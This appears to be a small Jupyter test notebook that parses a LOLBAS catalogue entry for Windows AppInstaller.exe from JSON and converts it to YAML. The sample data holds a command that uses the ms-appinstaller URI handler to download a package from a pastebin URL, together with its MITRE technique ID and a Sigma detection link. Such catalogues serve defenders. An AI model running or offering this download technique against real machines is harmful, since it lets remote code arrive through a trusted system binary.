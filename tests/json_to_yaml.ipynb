{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f0393422-22ef-476c-a7d4-4e97ecf90f0e",
   "metadata": {},
   "source": [
    "## Парсинг API JSON"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "a0ec0317-ea5e-469b-8957-b9e8818c04ca",
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "import yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "7e3870fb-7ba4-4016-a47c-6eb9b169cbe5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{\"Name\":\"AppInstaller.exe\",\"Description\":\"Tool used for installation of AppX/MSIX applications on Windows 10\",\"Author\":\"Wade Hickey\",\"Created\":\"2020-12-02\",\"Commands\":[{\"Command\":\"start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw\",\"Description\":\"AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\<RANDOM-8-CHAR-DIRECTORY>\",\"Usecase\":\"Download file from Internet\",\"Category\":\"Download\",\"Privileges\":\"User\",\"MitreID\":\"T1105\",\"OperatingSystem\":\"Windows 10\"}],\"Full_Path\":[{\"Path\":\"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\\\AppInstaller.exe\"}],\"Detection\":[{\"Sigma\":\"https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml\"}],\"Resources\":[{\"Link\":\"https://twitter.com/notwhickey/status/1333900137232523264\"}],\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/\"}'"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "raw = '{\"Name\":\"AppInstaller.exe\",\"Description\":\"Tool used for installation of AppX/MSIX applications on Windows 10\",\"Author\":\"Wade Hickey\",\"Created\":\"2020-12-02\",\"Commands\":[{\"Command\":\"start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw\",\"Description\":\"AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\\\Users\\\\%username%\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\<RANDOM-8-CHAR-DIRECTORY>\",\"Usecase\":\"Download file from Internet\",\"Category\":\"Download\",\"Privileges\":\"User\",\"MitreID\":\"T1105\",\"OperatingSystem\":\"Windows 10\"}],\"Full_Path\":[{\"Path\":\"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\\\\AppInstaller.exe\"}],\"Detection\":[{\"Sigma\":\"https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml\"}],\"Resources\":[{\"Link\":\"https://twitter.com/notwhickey/status/1333900137232523264\"}],\"url\":\"https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/\"}'\n",
    "raw"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "b2191130-a894-4467-9eb8-aacb64d8c199",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Name': 'AppInstaller.exe',\n",
       " 'Description': 'Tool used for installation of AppX/MSIX applications on Windows 10',\n",
       " 'Author': 'Wade Hickey',\n",
       " 'Created': '2020-12-02',\n",
       " 'Commands': [{'Command': 'start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw',\n",
       "   'Description': 'AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:/Users/%username%/AppData/Local/Packages/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe/AC/INetCache/<RANDOM-8-CHAR-DIRECTORY>',\n",
       "   'Usecase': 'Download file from Internet',\n",
       "   'Category': 'Download',\n",
       "   'Privileges': 'User',\n",
       "   'MitreID': 'T1105',\n",
       "   'OperatingSystem': 'Windows 10'}],\n",
       " 'Full_Path': [{'Path': 'C:/Program Files/WindowsApps/Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe/AppInstaller.exe'}],\n",
       " 'Detection': [{'Sigma': 'https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml'}],\n",
       " 'Resources': [{'Link': 'https://twitter.com/notwhickey/status/1333900137232523264'}],\n",
       " 'url': 'https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/'}"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data = json.loads(raw.replace('\\\\', '/'))\n",
    "data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "299cc711-0ca6-4125-ac7c-388706aeb988",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'AppInstaller.exe'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "value = data['Name']\n",
    "value"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "26e29597-1578-4324-846d-ffa76e8695bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "if 'Name' in data:\n",
    "    del data['Name']"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "5bb4cf4c-c50f-4361-befb-e03d34e16737",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"Author: Wade Hickey\\nCommands:\\n- Category: Download\\n  Command: start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw\\n  Description: AppInstaller.exe is spawned by the default handler for the URI, it\\n    attempts to load/install a package from the URL and is saved in C:/Users/%username%/AppData/Local/Packages/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe/AC/INetCache/<RANDOM-8-CHAR-DIRECTORY>\\n  MitreID: T1105\\n  OperatingSystem: Windows 10\\n  Privileges: User\\n  Usecase: Download file from Internet\\nCreated: '2020-12-02'\\nDescription: Tool used for installation of AppX/MSIX applications on Windows 10\\nDetection:\\n- Sigma: https://github.com/SigmaHQ/sigma/blob/bdb00f403fd8ede0daa04449ad913200af9466ff/rules/windows/dns_query/win_dq_lobas_appinstaller.yml\\nFull_Path:\\n- Path: C:/Program Files/WindowsApps/Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe/AppInstaller.exe\\nResources:\\n- Link: https://twitter.com/notwhickey/status/1333900137232523264\\nurl: https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/\\n\""
      ]
     },
     "execution_count": 33,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "yaml.dump(data)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
